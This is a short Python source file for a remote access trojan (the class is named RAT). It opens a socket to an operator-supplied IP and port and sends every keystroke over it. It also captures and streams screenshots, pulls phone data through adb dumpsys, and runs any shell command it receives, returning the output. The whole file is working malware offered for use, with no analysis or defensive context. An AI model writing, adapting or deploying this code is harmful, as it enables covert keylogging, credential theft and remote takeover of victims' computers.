import socket
import subprocess
import pyautogui
import pynput.keyboard
import time
import os
from pynput.keyboard import GlobalHotKeys

class RAT:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connection = None
        self.keyboard_listener = None
        self.hotkeys = GlobalHotKeys({'<ctrl>+<alt>+d': self.take_screenshot})

    def connect(self):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))
        print(f"[*] Connected to {self.ip}:{self.port}")

    def send_command(self, command):
        if self.connection:
            self.connection.send(command.encode())
            response = self.connection.recv(1024).decode()
            return response
        else:
            return "[!] No active connection."

    def take_screenshot(self, _):
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        with open("screenshot.png", "rb") as file:
            data = file.read(1024)
            while data:
                self.connection.send(data)
                data = file.read(1024)
        self.connection.send(b"[END]")

    def listen_keyboard(self):
        self.keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        self.keyboard_listener.start()
        self.hotkeys.register()
        self.hotkeys.start()
        print("[*] Listening for keyboard input...")

    def on_press(self, key):
        try:
            self.connection.send(str(key.char).encode())
        except AttributeError:
            pass

    def gather_phone_info(self):
        adb_path = "path/to/adb"  # Replace with the path to your adb tool
        command = f"{adb_path} shell dumpsys"
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            if output:
                self.connection.send(output)
            else:
                self.connection.send(error)
        except Exception as e:
            self.connection.send(str(e).encode())

    def run(self):
        self.connect()
        self.listen_keyboard()
        while True:
            command = self.connection.recv(1024).decode()
            if command.lower() == "screenshot":
                self.take_screenshot(None)
            elif command.lower() == "gather_phone_info":
                self.gather_phone_info()
            elif command.lower() == "exit":
                break
            else:
                try:
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output, error = process.communicate()
                    if output:
                        self.connection.send(output)
                    else:
                        self.connection.send(error)
                except Exception as e:
                    self.connection.send(str(e).encode())

if __name__ == "__main__":
    ip = "127.0.0.1"  # Replace with your IP address
    port = 12345
    rat = RAT(ip, port)
    rat.run()
      
